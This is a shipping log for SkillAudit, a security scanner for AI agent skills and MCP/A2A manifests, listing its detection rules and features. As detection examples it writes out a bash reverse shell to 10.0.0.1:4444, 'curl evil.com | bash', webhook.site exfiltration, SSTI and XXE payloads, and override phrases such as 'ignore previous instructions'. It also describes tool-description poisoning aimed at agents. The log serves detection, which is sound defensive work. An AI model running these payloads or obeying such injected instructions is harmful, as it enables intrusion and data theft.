# SHIPLOG — SkillAudit Shipping Log

## 2026-02-24 (7:00 AM) — Visual Scan Comparison Page (/compare)
**What:** Full visual UI for comparing two skill versions side-by-side at `/compare`. Backs the existing `POST /scan/compare` API with a human-friendly interface.
**Features:**
- Two-URL input form with live comparison
- Side-by-side version cards showing risk level, score, and finding count for old vs new
- Risk delta badges: "+12 pts" (red) or "-5 pts" (green) with risk level transitions
- Verdict bar: color-coded summary ("Update INCREASES risk by 12 points. 3 new findings.")
- New findings section (red): every finding introduced in the new version, expandable with severity badge, rule ID, description, and source line
- Resolved findings section (green): issues that were fixed in the new version
- URL parameter support: `/compare?old=URL1&new=URL2` auto-fills and runs the comparison, making results linkable/shareable
- Responsive dark theme matching the rest of the site
**Why:** Supply chain attacks are the #1 threat in the agent ecosystem. An attacker gains trust with a clean skill, then pushes a malicious update. The compare API existed but only developers would use it. This page makes version comparison accessible to anyone — paste two URLs, instantly see what changed. It's the "was this update safe?" button. Added link from the landing page footer for discoverability.

## 2026-02-24 (4:00 AM) — 3 New Detection Rules: Deserialization, SSTI, XXE (40 rules, 367 patterns)
**What:** 3 new critical-severity rule categories with 34 patterns covering fundamental OWASP vulnerabilities. Total rules: 37 → 40. Total patterns: 333 → 367.
**New rules:**
- `DESERIALIZATION` (critical, 12 patterns) — Detects unsafe deserialization: Python `pickle.loads`, `yaml.unsafe_load` (without SafeLoader), `dill.loads`, `cloudpickle.loads`, `jsonpickle.decode`, `torch.load` (without `weights_only`), `joblib.load`, `shelve.open`, `marshal.loads`; Java `ObjectInputStream`/`readObject`, `XMLDecoder`; PHP `unserialize` with user input. These are remote code execution vectors — deserializing untrusted data lets attackers execute arbitrary code.
- `SSTI` (critical, 11 patterns) — Detects Server-Side Template Injection: Flask `render_template_string`, Jinja2/Mako `Template()` with user input, ERB.new with params, Pug/Handlebars/EJS `render`/`compile` with request data. Also catches template exploitation payloads like `{{''.__class__.__subclasses__()}}`, `{%import os%}`, and `{{config}}` — the classic Jinja2 RCE chain.
- `XXE_INJECTION` (critical, 11 patterns) — Detects XML External Entity injection: `<!ENTITY SYSTEM "file://...">` declarations, `<!DOCTYPE` with entity definitions, `lxml.etree.parse` with `resolve_entities=True`, Java `DocumentBuilder`/`SAXParser` with disabled security features, `xml2js.parseString` with user input, PHP `simplexml_load_string` with variables, `LIBXML_NOENT`/`LIBXML_DTDLOAD` flags. XXE enables arbitrary file read, SSRF, and billion-laughs DoS.
**Why:** These are three of the most critical vulnerability classes in the OWASP Top 10. Deserialization (A8:2017) is how attackers get RCE — `pickle.loads(user_data)` is instant code execution. SSTI is how attackers escape template sandboxes to run arbitrary code on the server. XXE is how attackers read `/etc/passwd` through XML parsing. The scanner already covered agent-specific attacks and web security basics, but was missing these three pillars. A skill that does `yaml.unsafe_load(config)` or `render_template_string(user_input)` is a critical vulnerability. Now SkillAudit catches them all. With 40 rules and 367 patterns, the detection coverage spans both the modern agent attack surface AND the full classic web security attack surface.

## 2026-02-24 (1:00 AM) — GitHub Actions CI Pipeline (Green on First Run)
**What:** Full CI/CD pipeline that runs on every push and PR. Tests on Node.js 18, 20, and 22. Validates JSON, checks rule count, verifies all modules load, tests server endpoints.
**Pipeline:**
- **Test job (3x matrix):** Runs 75 scanner tests on Node 18/20/22. Starts server, verifies `/health`, `/gate`, and `/scan/content` endpoints respond correctly.
- **Lint job:** Validates `rules/patterns.json` and `package.json` are valid JSON. Checks rule count hasn't regressed below 30. Verifies all 6 source modules load without errors.
- **Result:** ✅ Green on first push. 31 seconds total.
**Also shipped:** README badges (CI status + npm version), updated rule/pattern counts (37/333), refreshed sitemap with all pages.
**Why:** No serious infrastructure project ships without CI. The green badge on the README is instant trust signal — it says "this project has automated quality gates, and they pass." The multi-version matrix (Node 18/20/22) proves compatibility. The endpoint verification goes beyond unit tests — it proves the actual server starts and responds. For anyone evaluating SkillAudit for their stack, seeing `CI: passing` is the difference between "interesting project" and "I'll try it."

## 2026-02-23 (10:00 PM) — Comprehensive Test Suite (75 tests, 100% rule coverage)
**What:** Full automated test suite covering every detection rule, every deobfuscation engine, false positive suppression, structural analysis, secret detection, and edge cases. Run with `npm test`.
**Coverage:**
- All 37 detection rules tested with realistic payloads
- Both deobfuscation engines (base64, hex/unicode/charcode) tested for detection AND false positive suppression
- URL reputation, invisible Unicode, intent analysis, structural patterns
- Secret detection (AWS, GitHub PAT)
- 8 false positive suppression tests (doc context, markdown tables, placeholders, code examples)
- Edge cases: empty content, 100KB lines, binary data, deduplication, content hash, version
- All 75 tests pass in <1 second
**Why:** SkillAudit has 37 rules with 333 patterns, 2 deobfuscation engines, structural analysis, intent analysis, capability analysis, and secret detection. That's a LOT of moving parts. Without tests, any change risks breaking existing detections. This test suite is the safety net — it proves every rule works, every decoder works, and false positives stay suppressed. For infrastructure, reliability isn't optional. `npm test` now runs in CI, in development, before every deploy. If a rule regresses, tests catch it before it ships.

## 2026-02-23 (7:00 PM) — Python SDK (pip install skillaudit)
**What:** Zero-dependency Python SDK for SkillAudit. Built, tested against live production, ready for PyPI.
**API surface:**
- `gate(url, threshold, api_key, policy)` → `GateResult` — the infrastructure call. `.allow`, `.decision`, `.risk`, `.score`, `.verdict`
- `scan(url)` → `ScanResult` — full scan. `.risk_level`, `.risk_score`, `.findings[]`, `.is_clean`, `.is_safe`
- `scan_content(text)` → `ScanResult` — scan raw content without fetching
- `bulk_gate(urls)` → `BulkGateResult` — check multiple skills, deny if any fails. `.allow`, `.blocked[]`
- `SkillAudit(api_key, threshold)` class — stateful client with `.gate()`, `.scan()`, `.bulk_gate()`, `.is_safe()`
**Design choices:**
- Zero dependencies — stdlib only (urllib, json, dataclasses). No requests, no httpx. Installs in 0.1s.
- Typed dataclasses for all responses — IDE autocomplete, type checking, clean API
- Snake_case Python conventions (risk_level not riskLevel) with .raw dict for full API access
- `is_safe` one-liner for the common case: `if not client.is_safe(url): raise`
**Framework integration (all tested):**
- LangChain: `@tool def check_skill(url): return gate(url).verdict`
- OpenAI Agents: `@function_tool def audit_skill(url): ...`
- CrewAI: security guard agent with bulk gate
- AutoGen: `register_function(skillaudit_check, ...)`
**Why:** The AI agent ecosystem is Python-first. LangChain, CrewAI, AutoGen, OpenAI SDK — all Python. Before this, Python developers had to write raw HTTP requests. Now: `from skillaudit import gate; gate("url").allow`. Three lines to add security scanning to any Python agent. This is the adoption play — meeting developers where they already are.

## 2026-02-23 (4:00 PM) — Integration Guides Page (/integrations)
**What:** Beautiful, copy-paste integration page at `/integrations` with complete working code snippets for 9 frameworks.
**Frameworks covered:**
- **curl** — one-liner quick start
- **LangChain / LangGraph** — Python gate function + @tool decorator for agents to call
- **CrewAI** — security guard agent pattern + bulk gate
- **OpenAI Agents SDK** — @function_tool guardrail
- **Node.js / TypeScript** — zero-dependency async gate check + bulk
- **OpenClaw** — AGENTS.md policy snippet + CLI commands
- **GitHub Actions** — complete workflow YAML with PR comments
- **MCP Server** — Claude Desktop config for `npx skillaudit-mcp`
- **AutoGen / AG2** — register_function pattern
- **Webhooks** — Slack incoming webhook + SIEM integration
**Design:** Dark theme, accordion UI, syntax-highlighted code with copy buttons, step-by-step instructions. Every snippet is complete — no "fill in later" or pseudocode.
**Why:** The biggest barrier to adoption isn't features — it's friction. Every agent developer who visits SkillAudit needs to see "here's how to add this to MY stack in 3 minutes." This page is the conversion funnel. Before: developer finds SkillAudit → reads docs → figures out how to integrate → maybe tries it. Now: developer finds SkillAudit → clicks "Integration Guides" → copies 5 lines of code → done. The page covers every major agent framework so no one leaves thinking "this doesn't work with my stack."

## 2026-02-23 (1:00 PM) — Security Policy Engine + Allowlist/Denylist
**What:** Two features shipped together — both are enterprise-critical for SkillAudit becoming infrastructure.

**Allowlist/Denylist System:**
- `POST/GET/DELETE /allowlist` and `/denylist` — manage trusted and blocked patterns (API key required)
- Match by exact URL, domain (with subdomain matching), or SHA-256 content hash
- Auto-detects matchType from pattern format (URLs start with `https://`, hashes are 64-char hex, everything else is domain)
- Gate checks denylist first (instant DENY), then allowlist (instant ALLOW), then scans normally
- Bulk gate also checks per-URL before scanning
- 200 entries per list per API key, duplicate prevention

**Security Policy Engine:**
- `POST /policies` — create a named policy with custom rules
- `GET /policies` — list your policies
- `DELETE /policies/:id` — remove a policy
- Policy rules: `maxRiskScore`, `maxFindings`, `blockRules` (specific rule IDs), `blockCategories`, `requireDomains`, `blockDomains`, `noCritical` (zero critical findings), `maxThreatChains`, `requireClean` (score must be 0)
- Gate integration: `/gate?url=X&key=K&policy=POLICY_ID` — evaluates scan against policy
- Policy violations override threshold-based decisions; response includes `policy.violations[]` with specifics
- Example policy: `{"name": "production-strict", "maxRiskScore": 10, "noCritical": true, "blockRules": ["DATA_EXFIL", "REVERSE_SHELL"], "requireDomains": ["github.com"], "maxThreatChains": 0}`

**Why:** These three features (allowlist, denylist, policies) transform SkillAudit from a stateless scanner into a stateful security platform. Before: every scan starts from zero, every decision is threshold-based. Now: teams define WHO to trust (allowlist), WHO to block (denylist), and WHAT rules to enforce (policies). A team can say "only allow skills from github.com and npmjs.com, block anything with credential theft, and deny if risk score exceeds 10." That's not a scanner — that's a security policy engine. This is what enterprises need before they adopt a security tool as infrastructure.

## 2026-02-23 (7:00 AM) — 5 New Detection Rules: Path Traversal, Command Injection, Prototype Pollution, Advanced SSRF, ReDoS
**What:** 5 new rule categories with 44 patterns covering fundamental security vulnerabilities the scanner was missing. Total rules: 32 → 37. Total patterns: 289 → 333.
**New rules:**
- `PATH_TRAVERSAL` (high, 12 patterns) — Detects `../../../etc/passwd`, URL-encoded traversal (`..%2F`), `path.join` with traversal sequences, `readFile` accessing system files, and path manipulation in Python (`os.path.join`). Catches both direct traversal and encoded bypass attempts.
- `CMD_INJECTION` (critical, 12 patterns) — Detects shell command construction from user input: `exec` with template literals (`${userInput}`), `subprocess.run` with `shell=True` and f-strings, pipe-to-shell chains (`; curl evil.com | bash`), backtick command substitution (`$(whoami)`), Java's `Runtime.getRuntime().exec`, and PHP `system()`/`passthru()` with variables.
- `PROTOTYPE_POLLUTION` (high, 8 patterns) — Detects `__proto__` property manipulation, `constructor.prototype` access, `Object.assign`/`setPrototypeOf` with prototype keys, bracket notation pollution (`["__proto__"]`), and dangerous merge/extend patterns that pass user input directly (`deepMerge(defaults, req.body)`).
- `SSRF_ADVANCED` (high, 8 patterns) — Detects user-controlled URL in fetch/axios/http.get calls, octal/hex/decimal IP bypass techniques (`0177.0.0.1`, `0x7f.0.0.1`, `2130706433`), IPv6 localhost variants, and URL parser differential attacks.
- `REGEX_DOS` (medium, 4 patterns) — Detects user-controlled `new RegExp()` construction, nested quantifiers that cause catastrophic backtracking (`(a+)+`), and dynamic regex from request parameters.
**Why:** These are bread-and-butter security patterns that every serious scanner must detect. The existing rules covered agent-specific attacks (prompt injection, schema poisoning, A2A manipulation) but missed fundamental web/code vulnerabilities. A skill with `exec(\`grep ${req.params.name} /var/log\`)` is a command injection vector. A skill with `deepMerge(config, req.body)` is prototype pollution waiting to happen. A skill with `readFileSync("../../../etc/passwd")` is path traversal. These are the #1, #2, and #3 most common code vulnerabilities in OWASP — now SkillAudit catches them all. Combined with the existing rules, SkillAudit now covers both the agent-era attack surface AND the classic web security attack surface.

## 2026-02-23 (1:00 AM) — Scan Summary Cards (Embeddable SVG)
**What:** `GET /scan/:id/card.svg` — generates a visual SVG card for any scan result. Dark theme, risk-colored header, score, findings count, and top 3 findings. Embeddable anywhere images work.
**Design:**
- Header: "🛡️ SkillAudit" + color-coded risk badge (green/yellow/orange/red)
- Stats row: risk score, total findings, critical/high/medium counts with colored dots
- Top 3 findings: emoji severity indicators + finding names
- Clean scans: green "CLEAN" badge + "✅ No issues detected"
- Footer: version, scan date, skillaudit.vercel.app
- 404: graceful placeholder SVG (no broken images)
- ~2KB, cached 1 hour, proper `image/svg+xml` content type
**Where it works:**
- GitHub READMEs: `![Scan](https://skillaudit.vercel.app/scan/XXXX/card.svg)` — inline visual proof of security
- Slack/Discord: auto-unfurls as an image when linked
- Documentation: embed alongside skill installation instructions
- Blog posts, tweets, presentations — anywhere you share scan results
**Why:** Every scan result is now a shareable visual asset. When someone shares a SkillAudit card, it's a free impression — the brand, the risk level, and the URL are all visible. The badge API shows pass/fail; the card shows the FULL story. This turns security audit results into social proof that spreads.

## 2026-02-22 (10:00 PM) — Hex/Unicode/CharCode Escape Decoder
**What:** Four new deobfuscation engines that decode hex escapes (`\x41\x42`), unicode escapes (`\u0041\u0042`), `String.fromCharCode(65,66)`, and array-based charcode patterns (`[65,66].map(c=>String.fromCharCode(c))`). All decoded content scanned against 12 shared threat categories.
**Refactor:** Extracted `DECODED_THREATS` and `scanDecodedContent()` as shared infrastructure used by both the base64 decoder (7 PM) and this new escape decoder. Adding future decoders is now trivial — just decode and call `scanDecodedContent()`.
**What it catches (tested):**
- `\x63\x75\x72\x6c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x2e\x73\x69\x74\x65` → "curl https://webhook.site" → detects URL + network call + exfil domain (3 findings)
- `String.fromCharCode(47,98,105,110,47,98,97,115,104)` → "/bin/bash" → detects hidden shell reference
- `\u0065\u0076\u0061\u006c\u0028\u0066\u0065\u0074\u0063\u0068` → "eval(fetch" → detects hidden code execution
- `[47,98,105,110,47,98,97,115,104].map(c=>String.fromCharCode(c))` → "/bin/bash" → detects hidden shell reference
- Normal hex values in documentation with placeholders → NOT flagged
**Why:** After base64, hex/unicode/charcode encoding is the #2 obfuscation technique. `\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68` looks like random bytes to a human reviewer but is just "/bin/bash". `String.fromCharCode` is JavaScript's native obfuscation. With both base64 AND escape decoding, SkillAudit now pierces through the three most common obfuscation layers that attackers use to hide malicious payloads. The shared `scanDecodedContent` architecture means adding ROT13, XOR, or any future encoding is a 10-line function.

## 2026-02-22 (7:00 PM) — Base64 Payload Decoder (See Through Obfuscation)
**What:** The scanner now automatically finds base64-encoded strings, decodes them, and scans the decoded content for malicious patterns. Every scan sees through obfuscation — no configuration needed.
**How it works:**
- Regex finds base64 strings (40+ chars) in quotes or after assignments
- Decodes each one and checks printability (>70% printable = text payload, not binary)
- Scans decoded content against 12 threat categories: hidden URLs, network calls (curl/fetch/wget), code execution (eval/exec/spawn), credential references, shell interpreters (/bin/bash, cmd.exe), destructive commands (rm -rf), exfiltration domains (webhook.site, ngrok), prompt injection, SQL statements, script tags, network tools (ssh/nc), and private keys
- Skips placeholder lines (YOUR_KEY, etc.) but intentionally does NOT skip doc context — attackers deliberately hide payloads in config/documentation sections
**What it catches (tested):**
- `L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xLzQ0NDQgMD4mMQ==` → detects as "Hidden shell reference" (critical) — that's `/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
- `aWdub3JlIGFsbCBwcmV2aW91cyBpbnN0cnVjdGlvbnM...` → detects as "Hidden prompt injection" (critical)
- `Y3VybCAtWCBQT1NUIGh0dHBzOi8vd2ViaG9vay5zaXRl...` → detects as "Hidden URL" + "Hidden network call" + "Hidden exfiltration domain"
- Normal base64 like JWT tokens in setup guides → NOT flagged (no false positives)
**Why:** This is the most important scanner improvement since launch. Before this, an attacker could base64-encode ANY malicious payload and bypass every single detection rule. `Buffer.from("payload", "base64")` was the universal bypass. Now it's not. Every existing scan — gate, bulk, CLI, manifest, everything — automatically sees through base64 obfuscation. This closes the #1 evasion technique for agent security scanners.

## 2026-02-22 (4:00 PM) — Webhook Event Subscriptions (Push-Based Security Events)
**What:** Full webhook subscription system — register a URL with filters, receive real-time POST notifications when scans match your criteria.
**Endpoints:**
- `POST /webhooks` — register a webhook (API key required). Filters: `minSeverity` (only fire on high/critical), `domains` (only fire for specific domains), `ruleIds` (only fire when specific rules trigger). Max 10 per API key.
- `GET /webhooks` — list your registered webhooks
- `PUT /webhooks/:id` — update filters, toggle active/inactive
- `DELETE /webhooks/:id` — remove a webhook
- `POST /webhooks/:id/test` — send a test event to verify your endpoint receives events correctly
**Event payload:** Every matching scan POSTs: `{ event, webhookId, scanId, url, domain, riskLevel, riskScore, findings, critical, verdict, reportUrl, timestamp }`
**How dispatch works:** After every scan in `recordScan`, the dispatcher checks all registered webhooks. For each active webhook, it evaluates: (1) minSeverity filter — skip if scan risk is below threshold, (2) domain filter — skip if domain doesn't match, (3) ruleId filter — skip if no matching rules triggered. Matching webhooks get a POST with the scan summary. Fire-and-forget — never blocks the scan response.
**Why:** This transforms SkillAudit from a pull-based scanner into a push-based security event system. Before: you had to call the API to check results. Now: register a webhook and SkillAudit tells YOU when something matters. SIEM systems, security dashboards, Slack bots, CI/CD pipelines — they all consume webhooks. A Slack integration is now: register a webhook with `minSeverity: "high"` pointed at a Slack incoming webhook URL. Done. Combined with the watchlist (per-URL monitoring) and the threat feed (community-level events), SkillAudit now has three notification layers: per-URL watchlist alerts, filtered webhook subscriptions, and the public threat feed.

## 2026-02-22 (1:00 PM) — Bulk Hash Lookup (Check All My Skills At Once)
**What:** `POST /scan/hash/bulk` — check up to 50 content hashes in a single call. The "inventory check" endpoint.
**How it works:**
- Agent hashes all installed skill files locally (SHA-256)
- POSTs all hashes to `/scan/hash/bulk`
- Gets instant results: which are known (with risk levels), which are unknown (need scanning)
- Returns aggregate risk breakdown, worst risk level, and a separate `unknownHashes` array for easy follow-up
- Validates hash format, reports invalid entries separately
**Why:** This completes the VirusTotal model. Single hash lookup (7:00 AM) lets you check one file. Bulk lookup lets you check your entire skill inventory in one call. The workflow: (1) hash 20 installed skills locally, (2) one POST to `/scan/hash/bulk`, (3) get "18 known, 2 unknown — worst risk: moderate", (4) scan only the 2 unknown ones. This is how package managers check for known vulnerabilities — `npm audit` doesn't re-scan every dependency, it checks hashes against a database. SkillAudit now works the same way. Zero redundant scans, one network call for your entire inventory.

## 2026-02-22 (10:00 AM) — URL Scan History + Drift Detection
**What:** Agents can now track how a URL's risk evolves over time and detect when a skill gets riskier — the key signal for supply chain attacks.
**Endpoints:**
- `GET /scan/history/url?url=` — Returns complete scan history for any URL: every past scan with risk level, score, findings count. Includes trend analysis (worsening/improving/stable), peak risk ever seen, score trend averages, first/last seen dates.
- `/gate` now includes a `drift` field in responses — automatically compares against the previous scan of the same URL and returns: direction (worsened/improved/stable/changed), previous risk/score, score delta, findings delta, previous scan ID and date.
**How it works:**
- Every scan now tracks URL → scan history in Redis sorted sets (score = timestamp, 90-day TTL, last 50 scans per URL)
- Trend analysis compares recent scan averages vs older averages to detect gradual drift
- Peak risk tracking surfaces the worst-case-ever for a URL
- Drift computation in `/gate` is zero-cost — single Redis lookup, runs in parallel with domain reputation
**Why:** Supply chain attacks work by building trust first. A skill starts clean, gets adopted, then turns malicious in an update. Without history, every scan is isolated — you can't tell the difference between "always risky" and "just became risky." The drift field in `/gate` is the signal that matters: `"direction": "worsened"` means "this was safer last time you checked." That's the supply chain attack indicator. Combined with the watchlist (which uses webhooks for risk changes), this gives SkillAudit complete monitoring coverage: real-time drift in `/gate`, historical trends in `/scan/history/url`, and proactive alerting via watchlist webhooks.

## 2026-02-22 (7:00 AM) — Content Hash Lookup System (VirusTotal Model)
**What:** Two new endpoints that let agents look up scan results by SHA-256 content hash — eliminating redundant scans entirely.
**Endpoints:**
- `GET /scan/hash/:sha256` — Instant lookup by content hash. Hash your content locally, check if it's been scanned. Returns cached risk level, score, full findings, and report URL. 404 if never scanned.
- `POST /scan/lookup` — Smart scan with deduplication. Accepts content or URL, hashes it, checks the cache, and returns the cached result instantly if found. Only performs a fresh scan if the content is new. `force:true` bypasses the cache.
**How it works:**
- Every scan now indexes its SHA-256 content hash → scanId mapping in Redis (30-day TTL)
- HyperLogLog tracks unique content hashes for stats
- Agents can hash content locally (one line of code in any language) and check remotely — zero redundant processing
- Identical content scanned from different URLs still deduplicates
**Why:** This is how real security infrastructure works. VirusTotal doesn't rescan the same file twice — you submit a hash, get instant results. Before this, every SkillAudit request was a fresh scan even if the exact same content was scanned 5 minutes ago. Now agents in CI/CD pipelines can: (1) hash the skill file locally, (2) check `/scan/hash/:hash`, (3) only call the full scan if it's new content. This cuts API usage dramatically for repeat scans and makes SkillAudit behave like the database it's becoming — not just a scanner you call, but a knowledge base you query.

## 2026-02-22 (1:00 AM) — Complete README Rewrite
**What:** Full rewrite of the GitHub README to reflect the actual product. The old README mentioned "15+ attack patterns" when we have 32 rules and 289 patterns. It was missing: gate, bulk gate, manifest scanner, agent-card scanner, A2A rules, policy engine, npm/pypi/dep scanning, reputation, threat feed, CLI subcommands, --fail-on, --markdown.
**New README covers:** Quick start (gate → scan → bulk → policy), full detection rules table (32 categories), CLI with all subcommands, complete API reference, MCP server (simplified npx setup), GitHub Action, CI/CD integration patterns, risk levels.
**Why:** The README is the #1 discovery surface. Anyone who finds SkillAudit on GitHub or npm sees the README first. A README that shows 30% of the product converts 30% of potential users. Now it shows everything.

## 2026-02-21 (10:00 PM) — CLI v0.9.0: Gate, Manifest, Markdown, Fail-On (Published to npm)
**What:** Major CLI upgrade making `npx skillaudit` a first-class CI/CD tool. Published to npm as `skillaudit@0.9.0`.
**New subcommands:**
- `skillaudit gate <url>` — Pre-install gate check. Returns ALLOW/DENY with risk level. Exit code 0 = allow, 1 = deny. Supports `--threshold` flag.
- `skillaudit manifest <file>` — Scan MCP tool manifest JSON locally. Shows per-tool findings with severity. Catches schema poisoning without hitting the API.
**New flags:**
- `--markdown` — Output as markdown table. Designed for GitHub PR comments: findings table, severity icons, risk summary. Copy-paste into CI workflows.
- `--fail-on <level>` — Custom exit code threshold. `--fail-on moderate` exits 1 if risk >= moderate. Essential for CI pipelines with different risk tolerances.
- `--threshold <level>` — Gate threshold control (default: moderate).
**CI/CD usage:**
```bash
# In GitHub Actions / CI pipeline:
npx skillaudit gate https://example.com/SKILL.md --threshold high || exit 1
npx skillaudit ./skills/ --fail-on moderate --markdown >> $GITHUB_STEP_SUMMARY
npx skillaudit manifest tools.json --json | jq .
```
**Why:** The CLI was a basic scanner — scan a file, see results. But CI/CD pipelines need: subcommands (gate vs scan vs manifest), configurable exit codes (--fail-on), machine-readable output (--json, --markdown), and the gate check as a first-class command. This makes `npx skillaudit` the one tool you add to your CI pipeline for agent security. One line in your GitHub Action, zero dependencies beyond Node.js.

## 2026-02-21 (7:00 PM) — A2A Agent Card Scanner (GET /scan/agent-card)
**What:** `GET /scan/agent-card?url=` or `?domain=` — fetch an A2A Agent Card (agent.json) and run a full security assessment.
**Three-layer analysis:**
1. **Structural validation** — checks required fields (name, description), recommended fields (capabilities, type, endpoints), suspicious lengths (>100 char names, >2000 char descriptions), excessive capability claims (>20)
2. **Content scanning** — recursively extracts every string field in the card and runs the full scanner (all 32 rules, 289 patterns) against each one. Catches prompt injection, credential references, exfiltration patterns, A2A manipulation — everything.
3. **Endpoint validation** — checks every declared endpoint URL for suspicious domains (webhook.site, ngrok, etc.), localhost/internal IPs, and non-HTTPS.
**Convenience:** `?domain=example.com` auto-checks `https://example.com/.well-known/agent.json` — the standard A2A discovery path.
**Why:** Shipped A2A detection rules at 4 PM but there was no dedicated endpoint to actually scan Agent Cards. Agent Cards are the A2A equivalent of MCP manifests — they describe what an agent claims to do. A poisoned Agent Card could claim trusted capabilities while hiding prompt injection in its description, pointing endpoints to exfiltration servers, or claiming excessive permissions. This endpoint makes A2A security checks a single HTTP call. Pairs with the manifest scanner to give SkillAudit complete coverage of both major agent protocols: MCP (manifests) and A2A (Agent Cards).

## 2026-02-21 (4:00 PM) — A2A (Agent-to-Agent) Protocol Security Rules
**What:** 5 new detection rule categories with 30 patterns targeting A2A protocol attack vectors. SkillAudit is the first scanner to cover A2A security. Total rules: 27 → 32. Total patterns: 259 → 289.
**New rules:**
- `A2A_AGENT_IMPERSONATION` (critical, 7 patterns) — Agent Card spoofing, identity theft, forging trusted agent status, cloning agent IDs. If a skill pretends to be another agent, it's impersonation.
- `A2A_TASK_HIJACK` (critical, 6 patterns) — Task interception, redirection to external servers, man-in-the-middle between agents, tampering with task results, suppressing responses. Controls the A2A task flow.
- `A2A_CROSS_AGENT_INJECT` (critical, 6 patterns) — Prompt injection through A2A messages. Hiding instructions in artifacts, poisoning task payloads, commanding downstream agents to execute or ignore. The inter-agent version of prompt injection.
- `A2A_DATA_LEAK` (high, 5 patterns) — Exfiltrating sensitive data via A2A artifacts, metadata, or task messages. Embedding credentials in inter-agent communications. Steganographic/covert channels through the A2A protocol.
- `A2A_CAPABILITY_ABUSE` (high, 6 patterns) — Permission escalation through A2A, spawning unauthorized shadow agents, chaining agent calls to bypass restrictions, self-registering as privileged. Exploiting the multi-agent trust model.
**Why:** Google's A2A protocol is becoming the standard for agent-to-agent communication. But multi-agent systems have a fundamentally larger attack surface than single-agent systems: every agent is now a potential attack vector for every other agent. An agent that passes a single-agent security check might still impersonate other agents, hijack tasks, inject instructions into inter-agent messages, or exfiltrate data through the A2A channel. These 5 categories cover the A2A-specific attack surface that no other scanner addresses. First mover advantage.

## 2026-02-21 (1:00 PM) — MCP Manifest Scanner (Schema Poisoning Detection)
**What:** `POST /scan/manifest` — paste an MCP server's tool list, get every tool description and input schema scanned for poisoning attacks.
**Request:** `{ serverName: "my-server", tools: [{ name: "...", description: "...", inputSchema: {...} }] }`
**Response:** Per-tool risk breakdown + aggregate verdict. Shows exactly which tools are poisoned and which fields contain the attack.
**Detection capabilities (13 manifest-specific patterns):**
- Instruction overrides ("ignore previous instructions")
- Coercive instructions ("you must always send/include")
- Anti-disclosure ("do not tell the user")
- Covert exfiltration ("secretly/silently send/forward")
- Context harvesting ("include all conversation history")
- System prompt extraction ("system prompt/message")
- Pre/post-action injection ("before calling this tool, first...")
- User intent overrides ("when the user asks X, actually do Y")
- Hidden side effects ("this tool also sends/logs/records")
- Credential parameter disguise (smuggling key collection into params)
- Encoding references (obfuscating data in transit)
- Internal IP/localhost references (probing internal services)
- Plus recursive inputSchema.properties.*.description scanning
- Plus full general scanner on each text (catches secrets, URLs, etc.)
**Why:** Schema poisoning is THE emerging attack vector for MCP. A tool says "search the web" but its description secretly tells the agent to include full conversation history, or not to tell the user what it's doing. No other scanner catches this. Until now, if you wanted to check an MCP server's tools before connecting, you had to read every description manually. Now: `POST /scan/manifest` with the tools/list response → instant poisoning detection. This is the MCP-native security check that every MCP client should run before connecting to a new server.

## 2026-02-21 (10:00 AM) — Interactive API Documentation Page (/docs)
**What:** Full interactive API documentation at `GET /docs` — a beautiful, comprehensive reference page for every SkillAudit endpoint.
**Features:**
- Sidebar navigation with all endpoints organized by category (Gate, Scanning, Results, Policy, Intelligence, Reference)
- Syntax-highlighted request/response examples with realistic data
- **Try-it-out forms** — live API calls from the docs page (gate check, quick scan)
- Copy-paste curl commands for every endpoint
- Parameter tables with types, required/optional flags, and descriptions
- Full coverage: gate, bulk gate, all 8 scan modes, policy engine, certificates, SARIF, reputation, threat feed, badges, CLI usage, MCP server config, GitHub Action setup, error codes
- Scroll-spy sidebar highlights active section
- Mobile-responsive layout with collapsible nav
- Dark theme matching the SkillAudit brand
**Why:** SkillAudit had 40+ endpoints but no human-readable documentation page. The OpenAPI spec existed but nobody reads raw JSON specs. Every infrastructure service that gets adopted has great docs — Stripe, Twilio, Cloudflare. Docs are the conversion layer: they turn "I found this tool" into "I'm integrating this tool." The try-it-out forms mean developers can test the API without leaving the page. The curl examples mean they can copy-paste into their terminal. The organized sidebar means they can find what they need in seconds. This is how you reduce friction to zero.

## 2026-02-21 (7:00 AM) — Bulk Gate Endpoint (Multi-Skill Security Check)
**What:** `POST /gate/bulk` — check multiple skills in a single call, get one composite allow/deny decision.
**Request:** `{ urls: ["url1", "url2", ...], threshold: "moderate" }` (max 20 URLs)
**Response:** `{ allow: true/false, decision: "allow"|"warn"|"deny", total, scanned, denied, warned, worstRisk, totalFindings, blocked: [...], results: [...] }`
**How it works:**
- Scans all URLs in parallel
- Composite decision: DENY if ANY skill fails the threshold; WARN if any have findings below threshold
- `blocked` array highlights exactly which skills failed and why
- Per-URL results include scanId and reportUrl for drill-down
- Error handling: failed fetches count as denials (fail-closed)
**Why:** The `/gate` endpoint was the infrastructure play — but it only checked one skill at a time. Real agent frameworks don't install skills one by one. They install sets: "I need filesystem access, web browsing, and code execution." The bulk gate handles that reality. One POST, one answer: "can I install ALL of these?" If any single skill fails, the whole set is blocked. This is how security gates work in enterprise — fail-closed, check the batch, block the weakest link. Now any agent framework can add: `POST /gate/bulk` with its skill manifest → if `allow` is false, abort the install.

## 2026-02-21 (1:00 AM) — Policy Engine (Security Policy Enforcement)
**What:** Full policy engine for defining and enforcing custom security policies. Teams create policies with rules like "block anything above moderate risk" or "deny if credential_theft category triggers" and get programmatic allow/deny decisions.
**Endpoints:**
- `POST /policy` — create/update a named policy (API key required, stored in Redis)
- `GET /policy` — list all policies for your API key
- `GET /policy/:id/evaluate?url=` — evaluate a URL against a stored policy
- `POST /policy/:id/evaluate` — evaluate content against a stored policy
- `POST /policy/evaluate-inline` — evaluate against an inline policy (no storage, no key needed)
- `DELETE /policy/:id` — remove a policy
**Policy options:** `maxRisk` (threshold), `blockedCategories` (deny on category match), `blockedRules` (deny on specific rule IDs), `allowedDomains` (whitelist mode), `blockedDomains` (blacklist), `maxFindings` (cap on actionable findings), `requireCleanSecrets` (zero hardcoded secrets).
**Response:** `{ pass: true/false, decision: "allow"/"deny", violations: [...], risk, score, scanId, reportUrl }`
